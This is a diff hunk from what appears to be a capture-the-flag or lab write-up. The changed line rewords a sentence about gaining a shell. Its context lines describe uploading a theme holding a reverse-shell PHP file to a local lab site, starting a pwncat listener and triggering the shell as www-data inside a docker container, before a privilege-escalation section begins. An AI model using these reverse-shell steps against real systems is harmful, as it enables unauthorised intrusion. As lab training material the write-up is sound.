@@ -192,7 +192,7 @@ Step 4: On the https://127.0.0.1:8002 site, click on appearance → Install new 
 Step 5: Open a netcat reverse shell (we will use pwncat as it gives a better shell): pwncat-cs -lp 443 <br>
 Step 6: To activate the reverse shell navigate to https://127.0.0.1:8002/themes/lateral/revshell.php
 
-We have shell as user www-data on 172.17.0.2
+We now have a shell as user www-data in a docker on 172.17.0.2.
 ________________________________________________________________
 <b>Docker Privilege Escalation:</b><br>
 Read file /opt/heartbeat.sh:
